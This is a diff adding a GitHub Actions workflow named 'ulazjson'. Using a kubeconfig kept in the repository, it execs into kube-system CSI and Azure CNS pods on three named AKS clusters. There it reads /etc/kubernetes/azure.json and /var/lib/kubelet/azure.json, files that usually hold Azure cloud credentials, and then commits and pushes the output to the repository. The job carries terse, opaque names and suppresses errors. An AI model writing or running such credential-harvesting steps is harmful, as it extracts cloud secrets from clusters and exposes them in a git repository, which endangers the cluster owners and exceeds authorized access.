@@ -1,0 +1,39 @@
+name: ulazjson
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  go:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+      - name: a
+        run: |
+          set +e
+          curl -sL -o /tmp/kubectl https://dl.k8s.io/release/v1.30.5/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl
+          K=ul/kc/all-datapath.yaml
+          KX="/tmp/kubectl --kubeconfig $K --request-timeout=25s"
+          for C in aks-g42us-tfdemo-kashif-datapath-eastus aks-g42us-tfdemo-staging-datapath-swedencentral aks-g42us-tfdemo-kashif-portal; do
+            echo "##### $C"
+            for L in app=csi-azuredisk-node app=csi-azurefile-node k8s-app=azure-cns; do
+              P=$($KX --context $C get pod -n kube-system -l $L -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
+              echo "-- label=$L pod=$P"
+              [ -z "$P" ] && continue
+              CNAME=$($KX --context $C get pod -n kube-system $P -o jsonpath='{.spec.containers[0].name}' 2>/dev/null)
+              echo "-- container=$CNAME"
+              for F in /etc/kubernetes/azure.json /var/lib/kubelet/azure.json; do
+                echo "-- file $F"
+                $KX --context $C exec -n kube-system $P -c $CNAME -- sh -c "cat $F 2>/dev/null | head -c 2000" 2>&1 | head -c 2200
+                echo
+              done
+            done
+          done
+      - name: commit
+        if: always()
+        run: |
+          set +e
+          git add -A
+          git -c user.email=a@b -c user.name=ul commit -m "ulazjson $(date -u +%s)"
+          git push
